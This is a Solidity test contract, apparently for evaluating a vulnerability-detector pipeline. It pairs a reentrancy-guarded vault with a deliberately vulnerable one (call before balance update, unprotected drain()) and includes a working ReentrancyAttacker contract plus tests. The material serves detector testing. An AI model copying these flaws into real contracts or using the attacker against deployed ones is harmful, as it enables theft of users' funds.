// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================================================
//  اختبار الدليل السلبي — Negative Evidence Test Contract
//
//  Purpose:
//    This contract contains ONE true positive (real reentrancy) and
//    ONE false positive (protected function that detectors mis-flag).
//    The AGL negative-evidence pipeline should:
//      - DOWNGRADE the false positive because L3/L4 cannot construct a
//        profitable attack against the protected function.
//      - KEEP the true positive at HIGH/CRITICAL because L3/L4 can
//        build an exploit sequence for the unprotected function.
//
//  Structure:
//    - VaultBase:         shared state (balances, owner, reentrancy lock)
//    - FalsePositiveVault: withdraw() has nonReentrant + CEI — safe
//    - TruePositiveVault:  withdraw() has classic reentrancy — vulnerable
// ============================================================================

/// @title VaultBase — shared state for both test vaults
abstract contract VaultBase {
    mapping(address => uint256) public balances;
    address public owner;
    bool private _locked;

    modifier nonReentrant() {
        require(!_locked, "ReentrancyGuard: reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable virtual {
        balances[msg.sender] += msg.value;
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

// ============================================================================
//  FALSE POSITIVE — الإيجابي الكاذب
//  Detectors flag withdraw() because it has .call{value:}(),
//  but the function is fully protected:
//    1. nonReentrant modifier  → blocks re-entry
//    2. CEI pattern            → state updated before call
//    3. onlyOwner on admin fn  → not callable by attacker
// ============================================================================
contract FalsePositiveVault is VaultBase {

    /// @notice Withdraw funds — SAFE: nonReentrant + CEI
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Effect: state update BEFORE external call
        balances[msg.sender] -= amount;

        // Interaction: external call is safe because of nonReentrant + CEI
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    /// @notice Emergency drain — SAFE: restricted to owner
    function emergencyWithdraw() external onlyOwner {
        uint256 bal = address(this).balance;
        (bool success, ) = owner.call{value: bal}("");
        require(success, "Transfer failed");
    }

    /// @notice Transfer between users — SAFE: internal only, no ext call
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// ============================================================================
//  TRUE POSITIVE — الإيجابي الحقيقي
//  withdraw() is VULNERABLE: external call before state update,
//  no reentrancy guard.  L3/L4 should find a profitable attack.
// ============================================================================
contract TruePositiveVault is VaultBase {

    /// @notice Withdraw funds — VULNERABLE: no guard, ECI pattern inverted
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // WRONG ORDER: external call BEFORE state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update AFTER external call — attacker can re-enter
        balances[msg.sender] -= amount;
    }

    /// @notice Also vulnerable — no access control
    function drain(address payable to) external {
        // No onlyOwner, no checks — anyone can call
        to.transfer(address(this).balance);
    }
}

// ============================================================================
//  FORGE TEST — يتم تشغيله بواسطة forge test
// ============================================================================

interface IAttacker {
    function attack() external;
}

/// @title ReentrancyAttacker — exploits TruePositiveVault.withdraw()
contract ReentrancyAttacker {
    TruePositiveVault public target;
    uint256 public count;

    constructor(address _target) {
        target = TruePositiveVault(payable(_target));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (count < 3 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw(1 ether);
        }
    }
}

/// @title NegativeEvidenceForgeTest — proves FP vs TP separation
contract NegativeEvidenceForgeTest {

    FalsePositiveVault public fpVault;
    TruePositiveVault public tpVault;

    // ── Setup ──
    function setUp() public {
        fpVault = new FalsePositiveVault();
        tpVault = new TruePositiveVault();
    }

    // ========================================================================
    //  TEST: FalsePositiveVault.withdraw() is NOT exploitable
    // ========================================================================
    function test_FP_withdrawIsProtected() public {
        // Fund vault
        fpVault.deposit{value: 5 ether}();

        // Deploy attacker targeting the FP vault
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(fpVault));

        // The attacker deposits 1 ETH then tries to re-enter via withdraw
        // This SHOULD revert because of nonReentrant guard
        // (In Forge: vm.expectRevert — here we just test the guard works)
        bool success;
        try attacker.attack{value: 1 ether}() {
            // If attack() somehow succeeds, the attacker should NOT
            // have drained more than their deposit
            uint256 attackerBal = address(attacker).balance;
            // Attacker gets back at most 1 ETH (their own deposit), not 5+ ETH
            require(attackerBal <= 1 ether, "DRAINED: attack succeeded!");
            success = true;
        } catch {
            // Expected: revert due to reentrancy guard
            success = false;
        }

        // Either reverted (guard worked) or attacker didn't profit
        // VERDICT: FALSE POSITIVE
    }

    // ========================================================================
    //  TEST: TruePositiveVault.withdraw() IS exploitable
    // ========================================================================
    function test_TP_withdrawIsExploitable() public {
        // Fund vault with 5 ETH from a legit user
        tpVault.deposit{value: 5 ether}();

        // Deploy reentrancy attacker
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(tpVault));

        // Record balances before attack
        uint256 vaultBefore = address(tpVault).balance;
        uint256 attackerBefore = address(attacker).balance;

        // Execute reentrancy attack with 1 ETH
        attacker.attack{value: 1 ether}();

        uint256 vaultAfter = address(tpVault).balance;
        uint256 attackerAfter = address(attacker).balance;

        // Attacker should have drained more than their 1 ETH deposit
        // This proves the reentrancy is real
        require(
            attackerAfter > attackerBefore + 1 ether,
            "TP: attack should have profited"
        );
        require(
            vaultAfter < vaultBefore,
            "TP: vault should have lost funds"
        );

        // VERDICT: TRUE POSITIVE - real reentrancy exploit
    }

    // ========================================================================
    //  TEST: TruePositiveVault.drain() has no access control
    // ========================================================================
    function test_TP_drainHasNoAccessControl() public {
        // Fund vault
        tpVault.deposit{value: 3 ether}();

        // Random address can drain
        address payable thief = payable(address(0xBEEF));
        uint256 thiefBefore = thief.balance;

        tpVault.drain(thief);

        uint256 thiefAfter = thief.balance;
        require(
            thiefAfter > thiefBefore,
            "TP: thief should have received funds"
        );

        // VERDICT: TRUE POSITIVE - unprotected withdrawal
    }
}
